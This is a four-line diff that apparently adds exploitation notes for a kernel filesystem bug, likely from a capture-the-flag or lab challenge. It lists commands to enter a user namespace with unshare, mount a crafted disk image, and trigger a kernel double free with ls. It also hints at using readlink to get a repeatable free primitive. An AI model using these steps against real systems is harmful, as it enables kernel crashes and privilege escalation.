@@ -1,0 +1,4 @@
+unshare -rm
+./mount_kbfs ./disk.iso /tmp
+`ls -lh /tmp/hello` will crash the kernel because of double free.
+to exploit it, use `readlink` in C to free exactly once (can be done infinite times)
